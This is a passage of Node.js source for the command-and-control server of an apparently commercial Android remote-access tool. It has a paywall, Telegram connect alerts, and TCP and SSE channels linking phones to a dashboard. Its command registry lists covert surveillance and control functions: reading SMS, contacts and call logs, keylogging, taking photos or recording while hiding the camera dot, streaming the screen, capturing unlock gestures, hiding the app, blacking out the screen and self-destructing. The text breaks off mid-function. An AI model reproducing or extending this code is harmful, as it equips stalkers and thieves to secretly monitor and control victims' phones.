// ============================================
// ACCESS CONTROL SERVER
// Android  → raw TCP  (net.Socket, port 6000)
// Dashboard → HTTP SSE (GET /api/events, persistent TCP)
//             HTTP POST (commands, ping — no WS, no queuing)
// ============================================

'use strict';

const express        = require('express');
const http           = require('http');
const net            = require('net');
const tls            = require('tls');
const cors           = require('cors');
const compression    = require('compression');
const helmet         = require('helmet');
const rateLimit      = require('express-rate-limit');
const { createCaptcha, verifyCaptcha } = require('./utils/captcha');
const path           = require('path');
const fs             = require('fs');
const crypto         = require('crypto');
const zlib           = require('zlib');
const mongoose       = require('mongoose');
const jwt            = require('jsonwebtoken');
const { spawn }      = require('child_process');
require('dotenv').config();
const { getJwtSecret } = require('./jwtSecret');

// ============================================
// RUNTIME LOG CAPTURE
// ============================================
const LOG_BUFFER_MAX = 1000;
const logBuffer      = [];
const logClients     = new Set();

function pushLog(source, level, message) {
    const lines = String(message).split('\n').map(l => l.trimEnd()).filter(Boolean);
    lines.forEach(line => {
        const entry = { ts: Date.now(), source, level, message: line };
        logBuffer.push(entry);
        if (logBuffer.length > LOG_BUFFER_MAX) logBuffer.shift();
        const payload = `data: ${JSON.stringify(entry)}\n\n`;
        for (const res of logClients) { try { res.write(payload); } catch (_) {} }
    });
}

['log', 'info', 'warn', 'error'].forEach(lvl => {
    const orig = console[lvl].bind(console);
    console[lvl] = (...args) => {
        orig(...args);
        pushLog('server', lvl === 'log' ? 'info' : lvl, args.join(' '));
    };
});

// ============================================
// FRP LAUNCHER  (frps → wait → frpc)
// ============================================
(function startFRP() {
    const ROOT = path.resolve(__dirname, '..');

    const frpsBin  = fs.existsSync('/usr/local/bin/frps') ? '/usr/local/bin/frps' : path.join(ROOT, 'frps', 'frps');
    const frpcBin  = fs.existsSync('/usr/local/bin/frpc') ? '/usr/local/bin/frpc' : path.join(ROOT, 'frpc', 'frpc');
    const frpsCfg  = fs.existsSync('/etc/frp/frps.toml')  ? '/etc/frp/frps.toml'  : path.join(ROOT, 'frps', 'frps.toml');
    const frpcCfg  = fs.existsSync('/etc/frp/frpc.toml')  ? '/etc/frp/frpc.toml'  : path.join(ROOT, 'frpc', 'frpc.toml');

    if (!fs.existsSync(frpsBin) || !fs.existsSync(frpcBin)) {
        console.warn('[FRP] Binaries not found — skipping FRP startup.');
        return;
    }

    function spawnFRP(bin, cfg, label) {
        const proc = spawn(bin, ['-c', cfg], { stdio: 'pipe' });
        proc.stdout.on('data', d => { process.stdout.write(`[${label}] ${d}`); pushLog(label, 'info', String(d)); });
        proc.stderr.on('data', d => { process.stderr.write(`[${label}] ${d}`); pushLog(label, 'warn', String(d)); });
        proc.on('exit', code => console.log(`[${label}] exited with code ${code}`));
        return proc;
    }

    function waitForPort(port, retries, delay, cb) {
        const sock = new net.Socket();
        sock.setTimeout(1000);
        sock.on('connect', () => { sock.destroy(); cb(null); });
        sock.on('error',   () => { sock.destroy(); retry(); });
        sock.on('timeout', () => { sock.destroy(); retry(); });
        sock.connect(port, '127.0.0.1');

        function retry() {
            if (retries <= 0) return cb(new Error(`Port ${port} not ready`));
            setTimeout(() => waitForPort(port, retries - 1, delay, cb), delay);
        }
    }

    console.log('[FRP] Starting frps...');
    spawnFRP(frpsBin, frpsCfg, 'frps');

    waitForPort(7000, 30, 1000, (err) => {
        if (err) {
            console.error('[FRP] frps did not become ready — frpc will not start.');
            return;
        }
        console.log('[FRP] frps ready. Starting frpc...');
        spawnFRP(frpcBin, frpcCfg, 'frpc');
    });
})();

// ── Redis ─────────────────────────────────────────────────────────────────────
const R = require('./redis');

// ============================================
// TELEGRAM NOTIFICATIONS
// ============================================

// Runtime-overridable settings (can be changed via /api/settings without restart)
const telegramSettings = {
    botToken:  process.env.TELEGRAM_BOT_TOKEN  || '',
    chatId:    process.env.TELEGRAM_CHAT_ID    || '',
    enabled:   true,
    notifyConnect: true,
};

// Build-worker settings — admin sets API key in dashboard Settings.
// The build.sh script (running anywhere — locally, on a VPS, in CI)
// authenticates with this key and polls /api/build/worker/poll for jobs.
//
// IMPORTANT for commercial deployments (Heroku, Zeabur, Render, Fly, Railway,
// etc.): always set BUILD_WORKER_API_KEY (or BUILD_API_KEY) as an environment
// variable on the backend. The dashboard's "Settings → Build worker API key"
// field also writes here, but it is in-memory only and is wiped on every
// dyno/container restart — which on most PaaS hosts happens daily or on every
// redeploy. The env var is the persistent source of truth.
//
// We .trim() the env value defensively because it is extremely common to copy
// the key into a PaaS dashboard with a leading/trailing space or newline, and
// the worker's curl request will not match if the comparison includes that
// whitespace.
const buildWorkerSettings = {
    apiKey: (process.env.BUILD_WORKER_API_KEY || process.env.BUILD_API_KEY || '').trim(),
};

// Payment / "Buy us a coffee" settings.
//   - paymentUrl   : the fixed NOWPayments invoice link shown in the paywall.
//   - priceUsd     : displayed amount.
//   - extendDays   : how long each successful payment unlocks the account.
//   - ipnSecret    : NOWPayments IPN secret for HMAC-SHA512 webhook verification
//                    (settable at runtime by admin OR via env at boot).
const paymentSettings = {
    paymentUrl: process.env.NOWPAYMENTS_PAYMENT_URL
        || 'https://nowpayments.io/payment/?iid=5745424570&paymentId=4699655886',
    priceUsd:   Number(process.env.NOWPAYMENTS_PRICE_USD || 25),
    extendDays: Number(process.env.NOWPAYMENTS_EXTEND_DAYS || 30),
    ipnSecret:  process.env.NOWPAYMENTS_IPN_SECRET || '',
};

// Recursively sort object keys (NOWPayments IPN signature is computed over the
// JSON body with keys sorted at every depth). Returns a new value; original is
// untouched. Arrays preserve order; primitives pass through.
function sortKeysDeep(value) {
    if (Array.isArray(value)) return value.map(sortKeysDeep);
    if (value && typeof value === 'object') {
        const sorted = {};
        for (const k of Object.keys(value).sort()) sorted[k] = sortKeysDeep(value[k]);
        return sorted;
    }
    return value;
}

async function sendTelegramRaw(botToken, chatId, text) {
    if (!botToken || !chatId) return;
    try {
        const https = require('https');
        const body  = JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' });
        const opts  = {
            hostname: 'api.telegram.org',
            path:     `/bot${botToken}/sendMessage`,
            method:   'POST',
            headers:  { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
        };
        await new Promise((resolve) => {
            const req = https.request(opts, (res) => {
                res.resume();
                res.on('end', resolve);
            });
            req.on('error', (e) => { log('TELEGRAM', `Send error: ${e.message}`, 'warn'); resolve(); });
            req.write(body);
            req.end();
        });
        log('TELEGRAM', `Sent notification to chat ${chatId}`);
    } catch (e) {
        log('TELEGRAM', `Error: ${e.message}`, 'warn');
    }
}

// Admin-level send: uses runtime-overridable global config (env-backed)
async function sendTelegram(text) {
    const { botToken, chatId, enabled } = telegramSettings;
    if (!enabled || !botToken || !chatId) return;
    return sendTelegramRaw(botToken, chatId, text);
}

// Visitor-level broadcast: each registered user with telegram enabled gets the
// notification on their personal bot (independent of admin config).
async function broadcastTelegramToUsers(text, kind = 'notify') {
    if (mongoose.connection.readyState !== 1) return;   // need MongoDB
    try {
        const filter = { role: 'user', telegramEnabled: true, telegramBotToken: { $ne: '' }, telegramChatId: { $ne: '' } };
        if (kind === 'connect') filter.telegramNotifyConnect = true;
        const users = await User.find(filter).select('telegramBotToken telegramChatId').lean();
        await Promise.all(users.map(u => sendTelegramRaw(u.telegramBotToken, u.telegramChatId, text)));
    } catch (e) {
        log('TELEGRAM', `User broadcast error: ${e.message}`, 'warn');
    }
}

// ============================================
// CONFIG
// ============================================
const TCP_PORT  = parseInt(process.env.TCP_PORT)  || 6000;
const HTTP_PORT = parseInt(process.env.PORT)       || 5000;
const PING_INTERVAL  = 20000;   // ms – ping every 20 s (was 30 s); faster detection of 3G drops
const PONG_TIMEOUT   = 90000;   // ms – drop if no pong in 90 s (3 missed pings); was 120 s
const CMD_TIMEOUT_MS = 45000;   // ms – command timeout (45 s); was 60 s

// ============================================
// RECORDINGS STORAGE
// ============================================
// Recordings are stored ONLY on the Android device, not on the server.

// ============================================
// COMMAND REGISTRY  (all cmds from SocketManager.java)
// ============================================
const COMMANDS = {
    // General / Device
    ping:                      { category: 'system',       label: 'Ping',                  icon: '📡' },
    vibrate:                   { category: 'device',       label: 'Vibrate',               icon: '📳' },
    play_sound:                { category: 'device',       label: 'Play Sound',            icon: '🔊' },
    get_clipboard:             { category: 'data',         label: 'Get Clipboard',         icon: '📋' },
    set_clipboard:             { category: 'data',         label: 'Set Clipboard',         icon: '📋' },
    get_device_info:           { category: 'system',       label: 'Device Info',           icon: 'ℹ️'  },
    get_location:              { category: 'location',     label: 'Get Location',          icon: '📍' },
    get_installed_apps:        { category: 'data',         label: 'Installed Apps',        icon: '📦' },
    get_battery_info:          { category: 'system',       label: 'Battery Info',          icon: '🔋' },
    get_network_info:          { category: 'system',       label: 'Network Info',          icon: '🌐' },
    get_wifi_networks:         { category: 'system',       label: 'WiFi Networks',         icon: '📶' },
    get_system_info:           { category: 'system',       label: 'System Info',           icon: '💻' },
    // SMS
    get_all_sms:               { category: 'sms',          label: 'Get All SMS',           icon: '💬' },
    get_sms_from_number:       { category: 'sms',          label: 'SMS From Number',       icon: '💬' },
    send_sms:                  { category: 'sms',          label: 'Send SMS',              icon: '📤' },
    delete_sms:                { category: 'sms',          label: 'Delete SMS',            icon: '🗑️' },
    // Contacts
    get_all_contacts:          { category: 'contacts',     label: 'Get Contacts',          icon: '👥' },
    search_contacts:           { category: 'contacts',     label: 'Search Contacts',       icon: '🔍' },
    // Calls
    get_all_call_logs:         { category: 'calls',        label: 'All Call Logs',         icon: '📞' },
    get_call_logs_by_type:     { category: 'calls',        label: 'Call Logs By Type',     icon: '📞' },
    get_call_logs_from_number: { category: 'calls',        label: 'Calls From Number',     icon: '📞' },
    get_call_statistics:       { category: 'calls',        label: 'Call Statistics',       icon: '📊' },
    // Camera
    get_available_cameras:     { category: 'camera',       label: 'Available Cameras',     icon: '📷' },
    take_photo:                { category: 'camera',       label: 'Take Photo',            icon: '📷' },
    camera_stream_start:       { category: 'camera',       label: 'Camera Stream Start',   icon: '🎥' },
    camera_stream_stop:        { category: 'camera',       label: 'Camera Stream Stop',    icon: '⏹️' },
    camera_record_start:       { category: 'camera',       label: 'Camera Record Start',   icon: '⏺️' },
    camera_record_stop:        { category: 'camera',       label: 'Camera Record Stop',    icon: '⏹️' },
    list_camera_recordings:    { category: 'camera',       label: 'List Camera Recordings',icon: '📋' },
    get_camera_recording:      { category: 'camera',       label: 'Get Camera Recording',  icon: '📥' },
    delete_camera_recording:   { category: 'camera',       label: 'Delete Camera Recording',icon:'🗑️'},
    camera_hide_dot:           { category: 'camera',       label: 'Hide Camera Dot',       icon: '🔴' },
    camera_show_dot:           { category: 'camera',       label: 'Show Camera Dot',       icon: '🟢' },
    get_camera_stream_status:  { category: 'camera',       label: 'Camera Stream Status',  icon: '📊' },
    // Screenshot
    take_screenshot:           { category: 'screen',       label: 'Take Screenshot',       icon: '📸' },
    // Files
    list_files:                { category: 'files',        label: 'List Files',            icon: '📁' },
    read_file:                 { category: 'files',        label: 'Read File',             icon: '📄' },
    write_file:                { category: 'files',        label: 'Write File',            icon: '✏️'  },
    delete_file:               { category: 'files',        label: 'Delete File',           icon: '🗑️' },
    copy_file:                 { category: 'files',        label: 'Copy File',             icon: '📋' },
    move_file:                 { category: 'files',        label: 'Move File',             icon: '📦' },
    create_directory:          { category: 'files',        label: 'Create Directory',      icon: '📂' },
    get_file_info:             { category: 'files',        label: 'File Info',             icon: '📄' },
    search_files:              { category: 'files',        label: 'Search Files',          icon: '🔍' },
    // Audio
    start_recording:           { category: 'audio',        label: 'Start Recording',       icon: '🎤' },
    stop_recording:            { category: 'audio',        label: 'Stop Recording',        icon: '⏹️' },
    get_recording_status:      { category: 'audio',        label: 'Recording Status',      icon: '🎙️' },
    get_audio:                 { category: 'audio',        label: 'Get Audio',             icon: '🎵' },
    list_recordings:           { category: 'audio',        label: 'List Recordings',       icon: '🎵' },
    delete_recording:          { category: 'audio',        label: 'Delete Recording',      icon: '🗑️' },
    // Keylogs
    get_keylogs:               { category: 'keylog',       label: 'Get Keylogs',           icon: '⌨️' },
    clear_keylogs:             { category: 'keylog',       label: 'Clear Keylogs',         icon: '🧹' },
    // Notifications
    get_notifications:         { category: 'notifications',label: 'Get Notifications',     icon: '🔔' },
    get_notifications_from_app:{ category: 'notifications',label: 'Notifs From App',       icon: '🔔' },
    clear_notifications:       { category: 'notifications',label: 'Clear Notifications',   icon: '🧹' },
    // Screen Control (Accessibility)
    touch:                     { category: 'screen_ctrl',  label: 'Touch',                 icon: '👆' },
    swipe:                     { category: 'screen_ctrl',  label: 'Swipe',                 icon: '↔️' },
    press_back:                { category: 'screen_ctrl',  label: 'Press Back',            icon: '◀️' },
    press_home:                { category: 'screen_ctrl',  label: 'Press Home',            icon: '🏠' },
    press_recents:             { category: 'screen_ctrl',  label: 'Press Recents',         icon: '⬜' },
    open_notifications:        { category: 'screen_ctrl',  label: 'Open Notifications',    icon: '🔔' },
    open_quick_settings:       { category: 'screen_ctrl',  label: 'Open Quick Settings',   icon: '⚙️' },
    scroll_up:                 { category: 'screen_ctrl',  label: 'Scroll Up',             icon: '⬆️' },
    scroll_down:               { category: 'screen_ctrl',  label: 'Scroll Down',           icon: '⬇️' },
    input_text:                { category: 'screen_ctrl',  label: 'Input Text',            icon: '✏️' },
    press_enter:               { category: 'screen_ctrl',  label: 'Press Enter',           icon: '↵' },
    click_by_text:             { category: 'screen_ctrl',  label: 'Click By Text',         icon: '🔍' },
    wake_screen:               { category: 'screen_ctrl',  label: 'Wake Screen',           icon: '💡' },
    request_storage_permission:{ category: 'permissions',  label: 'Request Storage Perm',  icon: '📂' },
    screen_off:                { category: 'screen_ctrl',  label: 'Screen Off',            icon: '🌑' },
    open_task_manager:         { category: 'screen_ctrl',  label: 'Task Manager',          icon: '🗂️' },
    // Stealth
    fully_hide_app:            { category: 'stealth',     label: 'Hide App (Full)',       icon: '🔒' },
    fully_show_app:            { category: 'stealth',     label: 'Show App (Full)',       icon: '🔓' },
    // Screen Reader (Accessibility)
    read_screen:               { category: 'screen_reader',label: 'Read Screen',           icon: '📺' },
    screen_reader_start:         { category: 'screen_reader',label: 'Screen Reader Start (Rec)', icon: '▶️'  },
    screen_reader_stop:          { category: 'screen_reader',label: 'Screen Reader Stop (Rec)',  icon: '⏹'  },
    screen_reader_stream_start:  { category: 'screen_reader',label: 'Screen Reader Stream Start', icon: '📡' },
    screen_reader_stream_stop:   { category: 'screen_reader',label: 'Screen Reader Stream Stop',  icon: '⏸' },
    find_by_text:              { category: 'screen_reader',label: 'Find By Text',          icon: '🔍' },
    get_current_app:           { category: 'screen_reader',label: 'Current App',           icon: '📱' },
    get_clickable_elements:    { category: 'screen_reader',label: 'Clickable Elements',    icon: '👆' },
    get_input_fields:          { category: 'screen_reader',label: 'Input Fields',          icon: '✏️'  },
    // Screen Reader Recordings (forwarded to device — recordings stored on Android only)
    list_screen_recordings:    { category: 'screen_reader',label: 'List Screen Recordings',icon: '🎞' },
    get_screen_recording:      { category: 'screen_reader',label: 'Get Screen Recording',  icon: '📥' },
    delete_screen_recording:   { category: 'screen_reader',label: 'Delete Screen Recording',icon: '🗑' },
    // Accessibility check
    get_accessibility_status:  { category: 'system',       label: 'Accessibility Status',  icon: '♿' },
    // Streaming
    stream_start:                { category: 'streaming',   label: 'Start Stream',          icon: '📡' },
    stream_stop:                 { category: 'streaming',   label: 'Stop Stream',           icon: '⏹️' },
    // Screen Recording (saved on device)
    screen_record_start:         { category: 'streaming',   label: 'Start Screen Rec',      icon: '🔴' },
    screen_record_stop:          { category: 'streaming',   label: 'Stop Screen Rec',       icon: '⏹️' },
    screen_record_list_local:    { category: 'streaming',   label: 'List Local Recs',       icon: '🎬' },
    screen_record_delete_local:  { category: 'streaming',   label: 'Delete Local Rec',      icon: '🗑️' },
    screen_record_get_local:     { category: 'streaming',   label: 'Get Local Rec',         icon: '📥' },
    // Frame on demand
    stream_request_frame:        { category: 'streaming',   label: 'Request Frame',         icon: '📸' },
    // Screen blackout
    screen_blackout_on:          { category: 'screen_ctrl', label: 'Blackout On',           icon: '⬛' },
    screen_blackout_off:         { category: 'screen_ctrl', label: 'Blackout Off',          icon: '⬜' },
    get_blackout_status:         { category: 'screen_ctrl', label: 'Blackout Status',       icon: '⬛' },
    // Permissions / App Mode
    get_permissions:             { category: 'system',      label: 'Get Permissions',       icon: '🔐' },
    request_permission:          { category: 'system',      label: 'Request Permission',    icon: '🔑' },
    request_all_permissions:     { category: 'system',      label: 'Request All Perms',     icon: '🔑' },
    // Keylogger
    list_keylog_files:           { category: 'keylog',      label: 'List Keylog Files',     icon: '📁' },
    download_keylog_file:        { category: 'keylog',      label: 'Download Keylog File',  icon: '⬇️' },
    // App Monitor
    list_app_monitor_apps:       { category: 'app_monitor', label: 'List Monitored Apps',   icon: '📡' },
    get_app_keylogs:             { category: 'app_monitor', label: 'Get App Keylogs',       icon: '⌨️' },
    list_app_keylog_files:       { category: 'app_monitor', label: 'List App Keylog Files', icon: '📁' },
    download_app_keylog_file:    { category: 'app_monitor', label: 'Download App Keylog',   icon: '⬇️' },
    list_app_screenshots:        { category: 'app_monitor', label: 'List App Screenshots',  icon: '📷' },
    download_app_screenshot:     { category: 'app_monitor', label: 'Download App Screenshot',icon:'⬇️' },
    // App Manager
    uninstall_app:               { category: 'app_manager', label: 'Uninstall App',         icon: '🗑️' },
    force_stop_app:              { category: 'app_manager', label: 'Force Stop App',        icon: '⏹️' },
    open_app:                    { category: 'app_manager', label: 'Open App',              icon: '▶️' },
    clear_app_data:              { category: 'app_manager', label: 'Clear App Data',        icon: '🧹' },
    disable_app:                 { category: 'app_manager', label: 'Disable App',           icon: '🚫' },
    add_monitored_app:           { category: 'app_manager', label: 'Monitor App',           icon: '📡' },
    remove_monitored_app:        { category: 'app_manager', label: 'Stop Monitoring App',   icon: '📡' },
    // File Manager
    list_files:                  { category: 'files',       label: 'List Files',            icon: '📂' },
    read_file:                   { category: 'files',       label: 'Read File',             icon: '📄' },
    delete_file:                 { category: 'files',       label: 'Delete File',           icon: '🗑️' },
    // Self-destruct
    self_destruct:               { category: 'system',      label: 'Self Destruct',         icon: '💣' },
    // Gesture Pattern
    gesture_draw_pattern:        { category: 'gesture',     label: 'Draw Pattern',          icon: '🖊' },
    gesture_auto_capture_start:  { category: 'gesture',     label: 'Auto-Capture Start',    icon: '⏺' },
    gesture_auto_capture_stop:   { category: 'gesture',     label: 'Auto-Capture Stop',     icon: '⏹' },
    gesture_list:                { category: 'gesture',     label: 'List Gestures',         icon: '📋' },
    gesture_get:                 { category: 'gesture',     label: 'Get Gesture',           icon: '📄' },
    gesture_replay:              { category: 'gesture',     label: 'Replay Gesture',        icon: '▶️' },
    gesture_delete:              { category: 'gesture',     label: 'Delete Gesture',        icon: '🗑️' },
    gesture_live_start:          { category: 'gesture',     label: 'Live Stream Start',     icon: '📡' },
    gesture_live_stop:           { category: 'gesture',     label: 'Live Stream Stop',      icon: '⏹' },
    gesture_live_points:         { category: 'gesture',     label: 'Live Stream Points',    icon: '📍' },
    gesture_live_delete:         { category: 'gesture',     label: 'Live Stream Delete',    icon: '🗑️' },
    gesture_live_replay:         { category: 'gesture',     label: 'Live Stream Replay',    icon: '▶️' },
    gesture_live_list:           { category: 'gesture',     label: 'Live Stream List',      icon: '📋' },
    // Task Studio
    run_task_local:              { category: 'task',        label: 'Run Task (Local)',       icon: '▶️' },
    // Connection management
    restart_connection:          { category: 'system',      label: 'Restart Connection',    icon: '🔄' },
    // Audio / Volume control
    mute_device:                 { category: 'device',      label: 'Mute Device',           icon: '🔇' },
    unmute_device:               { category: 'device',      label: 'Unmute Device',         icon: '🔔' },
    // Wake / Keep-alive
    wake_keep_alive_start:       { category: 'screen_ctrl', label: 'Wake Keep-Alive Start', icon: '⏰' },
    wake_keep_alive_stop:        { category: 'screen_ctrl', label: 'Wake Keep-Alive Stop',  icon: '⏹️' },
};

// ============================================
// MONGOOSE MODELS
// ============================================
const Device      = require('./models/Device');
const User        = require('./models/User');
const Command     = require('./models/Command');
const ActivityLog = require('./models/ActivityLog');
const Task        = require('./models/Task');

const authRoutes    = require('./routes/auth');
const devicesRoutes = require('./routes/devices');
const userAuthRoutes = require('./routes/userAuth');

const MONGO_URI =
    process.env.MONGODB_URI ||
    process.env.MONGODB_URL ||
    process.env.mongodb_url ||
    process.env.mongodb_uri ||
    'mongodb://localhost:27017/access-control';

const _mongoKey = process.env.MONGODB_URI ? 'MONGODB_URI'
    : process.env.MONGODB_URL             ? 'MONGODB_URL'
    : process.env.mongodb_url             ? 'mongodb_url'
    : process.env.mongodb_uri             ? 'mongodb_uri'
    : '(fallback: localhost)';
log('DB', `Connecting via env key: ${_mongoKey}, protocol: ${MONGO_URI.split('://')[0]}, host starts with: ${MONGO_URI.split('@')[1]?.split('/')[0]?.substring(0,30) || 'N/A'}`);

mongoose.connect(MONGO_URI, {
    serverSelectionTimeoutMS: 5000,
    socketTimeoutMS: 45000
}).then(async () => {
    log('DB', 'MongoDB connected');
    // Mark every device offline on startup — the in-memory TCP map is empty after
    // a restart, so any device still flagged online in the DB is a stale ghost.
    // Devices will flip back to online as soon as they re-register over TCP.
    try {
        const r = await Device.updateMany({ isOnline: true }, { isOnline: false, lastSeen: new Date() });
        if (r.modifiedCount > 0) log('DB', `Startup: marked ${r.modifiedCount} stale device(s) offline`);
    } catch (e) { log('DB', 'Startup offline-mark failed: ' + e.message, 'warn'); }
}).catch(e => log('DB', 'MongoDB unavailable: ' + e.message, 'warn'));

// ============================================
// STATE
// TCP for Android devices; SSE (HTTP) for Dashboard
// ============================================
/** @type {Map<string, net.Socket & {id:string, deviceId?:string, clientType:'android', lastPong:number, buf:string}>} */
const tcpClients = new Map();          // connId → TCP socket
/** @type {Map<string, {res: import('express').Response, token:string}>} */
const sseClients = new Map();          // clientId → { res, token }
/** @type {Map<string, string>} */
const deviceToTcp = new Map();         // deviceId → primary TCP connId
/** @type {Map<string, string>} */
const deviceToStreamTcp = new Map();   // deviceId → stream channel TCP connId
/** @type {Map<string, string>} */
const deviceToLiveTcp = new Map();     // deviceId → live channel TCP connId
/** @type {Map<string, {sseId:string, command:string, deviceId:string, timer:NodeJS.Timeout}>} */
const pendingCmds = new Map();         // commandId → pending info
/** @type {Map<string, Object>} In-memory device registry for when MongoDB is unavailable */
const inMemoryDevices = new Map();     // deviceId → device object
/** @type {Set<string>} Devices that have an active stream session */
const deviceStreamingState = new Set(); // deviceId → streaming active
/** @type {Map<string, number>} Timestamp (ms) of last device:ping sent — used to compute true TCP RTT */
const devicePingTime = new Map();       // deviceId → Date.now() when ping was sent
/** @type {Map<string, number>} Track last frame relay time per device for throttling */
const deviceLastFrameMs = new Map();    // deviceId → Date.now() of last relayed frame
const FRAME_RELAY_MIN_MS = 100;         // Never relay frames faster than 10 FPS to SSE clients
/** @type {Map<string, Object>} Latest screen reader frame per device — polled by dashboard */
const latestScreenReaderData = new Map(); // deviceId → { success, screen, deviceId, _ts }
/** @type {Map<string, Object>} Latest JPEG stream frame per device — polled by dashboard */
const latestStreamFrame = new Map();      // deviceId → { frameData, deviceId, _ts, screenWidth?, screenHeight? }
/** @type {Map<string, Object>} Latest camera JPEG frame per device — polled by CameraMonitorTab */
const latestCameraFrame = new Map();      // deviceId → { frameData, cameraId, deviceId, _ts }

// ============================================
// LOGGING HELPERS
// ============================================
function log(tag, msg, level = 'info') {
    const ts = new Date().toISOString().slice(11, 23);
    const fn = level === 'warn' ? console.warn : level === 'error' ? console.error : console.log;
    fn(`[${ts}][${tag}] ${msg}`);
}

// ============================================
// PROTOCOL HELPERS
// Both TCP and WS use the same JSON envelope:
//   { "event": "...", "data": { ... } }
// TCP: newline-terminated strings  (SocketManager.java style)
// WS:  WebSocket text frames       (same JSON, no newline needed)
// ============================================

/** Send a protocol message to a TCP (Android) client */
function tcpSend(conn, event, data) {
    if (conn && conn.writable) {
        conn.write(JSON.stringify({ event, data }) + '\n');
    }
}

/** Push a server-sent event to one specific SSE (Dashboard) client */
function sseSend(clientId, event, data) {
    const client = sseClients.get(clientId);
    if (client && !client.res.writableEnded) {
        client.res.write(`data: ${JSON.stringify({ event, data })}\n\n`);
        if (typeof client.res.flush === 'function') client.res.flush();
    }
}

/** Broadcast an event to ALL connected SSE dashboard clients */
function broadcastDash(event, data) {
    if (sseClients.size === 0) return;
    // Pre-serialize once — avoids re-running JSON.stringify (which is expensive for large
    // stream:frame payloads) for every connected dashboard tab.
    const payload = `data: ${JSON.stringify({ event, data })}\n\n`;
    for (const [id, client] of sseClients) {
        if (!client.res.writableEnded) {
            client.res.write(payload);
            if (typeof client.res.flush === 'function') client.res.flush();
        }
    }
}

// ============================================
// SHARED MESSAGE PROCESSOR
// Both TCP and WS messages go through here
// ============================================
async function processMessage(clientId, clientType, event, data) {
    // Skip per-message log for high-frequency / noisy events.
    const highFreq = event === 'stream:frame'       || event === 'keylog:entry'  ||
                     event === 'notification:entry'  || event === 'app:foreground'||
                     event === 'device:heartbeat'    || event === 'device:pong'   ||
                     event === 'command:response'    || event === 'screen:update' ||
                     event === 'offline_recording:save';
    if (!highFreq) {
        log(clientType === 'android' ? 'TCP' : 'WS', `← [${clientId}] ${event}`);
    }

    // ── Events expected from Android (TCP) ──────────────────────────
    if (event === 'device:register') {
        const { deviceId, deviceInfo } = data || {};
        if (!deviceId) return;
        // Access ID — sent by the device, baked in at build time.
        // Kept on the device record so per-user dashboards can scope their list.
        const accessId = (data && (data.accessId || (deviceInfo && deviceInfo.accessId))) || '';

        // If there's an existing stale primary socket for this device, close it cleanly
        // before registering the new one — prevents ghost connections from later
        // broadcasting false device:disconnected events when they eventually time out.
        const existingPrimaryId = deviceToTcp.get(deviceId);
        if (existingPrimaryId && existingPrimaryId !== clientId) {
            const stale = tcpClients.get(existingPrimaryId);
            if (stale) {
                stale.destroy();
                tcpClients.delete(existingPrimaryId);
            }
        }

        // Link this TCP connection to the deviceId
        const conn = tcpClients.get(clientId);
        if (conn) {
            conn.deviceId = deviceId;
            conn.lastPong = Date.now();
            deviceToTcp.set(deviceId, clientId);
        }

        // Always update in-memory registry
        const info = { model: deviceInfo?.model, manufacturer: deviceInfo?.manufacturer,
                       androidVersion: deviceInfo?.androidVersion, name: deviceInfo?.name,
                       screenWidth: deviceInfo?.screenWidth, screenHeight: deviceInfo?.screenHeight };
        const existing = inMemoryDevices.get(deviceId) || {};
        const prevLastSeen = existing.lastSeen ? new Date(existing.lastSeen).getTime() : 0;
        const prevOnline   = !!existing.isOnline;
        const RECONNECT_THRESHOLD_MS = 5 * 60 * 1000;
        const isFreshConnect = !prevLastSeen || (!prevOnline && (Date.now() - prevLastSeen) > RECONNECT_THRESHOLD_MS);
        const deviceRecord = { ...existing, deviceId,
            deviceName: deviceInfo?.name || deviceId, deviceInfo: info,
            accessId: accessId || existing.accessId || '',
            isOnline: true, lastSeen: new Date() };
        inMemoryDevices.set(deviceId, deviceRecord);

        // Persist to Redis
        R.saveDevice(deviceId, deviceRecord).catch(() => {});

        // Persist / update (optional MongoDB)
        try {
            let dev = await Device.findOne({ deviceId });
            if (!dev) {
                dev = new Device({ deviceId, deviceName: deviceInfo?.name || deviceId,
                                   deviceInfo: info, accessId: accessId || '', isOnline: true });
            } else {
                dev.isOnline  = true;
                dev.lastSeen  = new Date();
                dev.deviceInfo = { ...(dev.deviceInfo || {}), ...info };
                if (accessId) dev.accessId = accessId;
                dev.markModified('deviceInfo');
            }
            await dev.save();
        } catch (e) { log('DB', 'save error: ' + e.message, 'warn'); }

        // Load saved tasks from MongoDB (device-specific + global) and send them to the device
        let deviceTasks = [];
        try {
            deviceTasks = await Task.find({ $or: [{ deviceId }, { deviceId: 'global' }] })
                .sort({ updatedAt: -1 }).lean();
        } catch (_) {}

        // Ack back to device
        if (conn) tcpSend(conn, 'device:registered', { success: true, deviceId, tasks: deviceTasks });

        // Notify dashboards (only on a real fresh connect, not re-registers within 5 min)
        if (isFreshConnect) {
            broadcastDashScoped('device:connected', { deviceId, deviceInfo, accessId, timestamp: new Date() }, accessId || null);
        }
        broadcastDeviceList();

        // Telegram notification — only on a real fresh connect (>5 min since last seen)
        if (isFreshConnect) {
            const name  = deviceInfo?.name || deviceId;
            const model = [deviceInfo?.manufacturer, deviceInfo?.model].filter(Boolean).join(' ') || 'Unknown';
            const ts    = new Date().toLocaleString();
            const text  =
                `📱 <b>Device Connected</b>\n` +
                `🆔 ID: <code>${deviceId}</code>\n` +
                `📛 Name: ${name}\n` +
                `📟 Model: ${model}\n` +
                `🕐 Time: ${ts}`;
            if (telegramSettings.notifyConnect) sendTelegram(text);
            broadcastTelegramToUsers(text, 'connect');
        }
        return;
    }

    // ── Multi-channel registration from Android secondary sockets ────────────
    if (event === 'device:register_channel') {
        const { deviceId, channelType } = data || {};
        if (!deviceId || !channelType) return;
        const conn = tcpClients.get(clientId);
        if (conn) {
            conn.deviceId    = deviceId;
            conn.channelType = channelType;
            conn.lastPong    = Date.now();
            if (channelType === 'stream') {
                // Evict old stale stream socket before registering the new one
                const oldStreamId = deviceToStreamTcp.get(deviceId);
                if (oldStreamId && oldStreamId !== clientId) {
                    const stale = tcpClients.get(oldStreamId);
                    if (stale) { stale.destroy(); tcpClients.delete(oldStreamId); }
                }
                deviceToStreamTcp.set(deviceId, clientId);
                log('TCP', `Stream channel registered for ${deviceId}`);
                // Auto-resume streaming if device had an active stream session
                if (deviceStreamingState.has(deviceId)) {
                    const primaryId = deviceToTcp.get(deviceId);
                    const primaryConn = primaryId ? tcpClients.get(primaryId) : null;
                    if (primaryConn && primaryConn.writable) {
                        const autoCommandId = crypto.randomBytes(12).toString('hex');
                        setTimeout(() => {
                            tcpSend(primaryConn, 'command:execute', { commandId: autoCommandId, command: 'stream_start', params: null });
